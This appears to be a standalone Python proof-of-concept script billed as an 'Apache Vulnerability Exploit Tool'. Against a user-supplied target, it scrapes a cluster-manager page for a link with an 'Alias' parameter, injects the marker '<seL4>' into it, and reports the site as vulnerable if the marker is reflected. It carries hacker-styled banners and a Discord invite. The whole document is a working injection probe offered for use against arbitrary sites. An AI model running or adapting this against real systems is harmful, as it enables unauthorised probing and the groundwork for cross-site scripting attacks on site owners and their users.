import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import sys

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'

def progress_bar(task_name, duration=2, bar_length=30):
    for i in range(bar_length + 1):
        percent = int(100 * (i / bar_length))
        bar = ('â–ˆ' * i) + ('-' * (bar_length - i))
        sys.stdout.write(f'\r{Colors.CYAN}[{bar}] {percent}% {task_name}{Colors.RESET}')
        sys.stdout.flush()
        time.sleep(duration / bar_length)
    print()

def fetch_url(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response
    except requests.exceptions.Timeout:
        print(Colors.RED + f"\nError: Request to {url} timed out." + Colors.RESET)
    except requests.exceptions.RequestException as e:
        print(Colors.RED + f"\nError: {e}" + Colors.RESET)
    return None

def get_cluster_manager_url(base_url, path):
    print(Colors.YELLOW + f"Initiating exploitation on {base_url}..." + Colors.RESET)
    progress_bar("Connecting to target")

    response = fetch_url(base_url + path)
    if not response:
        return None

    print(Colors.YELLOW + f"\nAnalyzing exploit on {base_url}..." + Colors.RESET)
    progress_bar("Scanning for vulnerabilities")

    soup = BeautifulSoup(response.text, 'html.parser')
    all_links = soup.find_all('a', href=True)

    for link in all_links:
        parsed_url = urlparse(link['href'])
        query_params = parse_qs(parsed_url.query)
        alias_value = query_params.get('Alias')

        if alias_value:
            print(Colors.GREEN + "\nAlias value found!" + Colors.RESET)
            return link['href']

    print(Colors.RED + "\nError: Alias value not found." + Colors.RESET)
    return None

def update_alias_value(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query, keep_blank_values=True)
    query_params['Alias'] = ["<seL4>"]
    updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True)))
    print(Colors.GREEN + f"\nURL modified successfully: {updated_url}" + Colors.RESET)
    return updated_url

def check_response_for_value(url, check_value):
    print(Colors.YELLOW + "\nVerifying response..." + Colors.RESET)
    progress_bar("Processing response")

    response = fetch_url(url)
    if not response:
        return

    if check_value in response.text:
        print(Colors.RED + "Website is vulnerable! Proof of Concept by seL4:" + Colors.RESET)
    else:
        print(Colors.GREEN + "Website is not vulnerable. Proof of Concept by seL4:" + Colors.RESET)

    print(Colors.MAGENTA + r"""

  _________      .____       _____
 /   _____/ ____ |    |     /  |  |
 \_____  \_/ __ \|    |    /   |  |_
 /        \  ___/|    |___/    ^   /
/_______  /\___  >_______ \____   |
        \/     \/        \/    |__|

    https://discord.gg/K83cX7ZaBM
    """ + Colors.RESET)

def main():
    parser = argparse.ArgumentParser(description="Apache Vulnerability Exploit Tool")

    parser.add_argument('-t', '--target', help='Target domain (e.g., https://example.com)', required=True)
    parser.add_argument('-u', '--url', help='URL path (e.g., /cluster-manager)', required=True)

    args = parser.parse_args()

    cluster_manager_url = get_cluster_manager_url(args.target, args.url)
    if cluster_manager_url:
        modified_url = update_alias_value(args.target + cluster_manager_url)
        check_response_for_value(modified_url, "<seL4>")

if __name__ == "__main__":
    main()
